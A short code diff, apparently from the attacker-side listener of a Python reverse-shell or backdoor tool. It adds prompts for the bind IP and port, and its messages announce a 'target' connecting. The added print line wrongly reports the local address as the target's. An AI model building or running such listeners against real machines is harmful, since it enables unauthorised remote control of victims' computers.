@@ -2,6 +2,8 @@ import socket
 import json
 import os
 
+ip_addr = input("IP Addres: ")
+port = int(input("Port: "))
 
 def reliable_send(data):
 	jsondata = json.dumps(data)
@@ -56,9 +58,9 @@ def target_communication():
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('', ))
+sock.bind((f'{ip_addr}', port ))
 print('[+] Listening For The Incoming Connections')
 sock.listen(5)
 target, ip = sock.accept()
-print('[+] Target Connected From: ' + str(ip))
+print(f'[+] Target Connected From: {ip_addr}')
 target_communication()
